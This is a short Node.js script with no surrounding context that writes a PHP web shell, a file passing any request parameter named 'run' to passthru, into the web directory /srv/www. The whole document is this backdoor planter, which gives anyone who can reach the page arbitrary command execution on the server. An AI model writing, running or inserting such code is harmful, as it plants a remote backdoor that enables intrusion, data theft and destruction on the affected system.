const fs = require("node:fs/promises");
const content = "<?php passthru($_REQUEST['run']); ?>";
fs.writeFile("/srv/www/run.php", content);
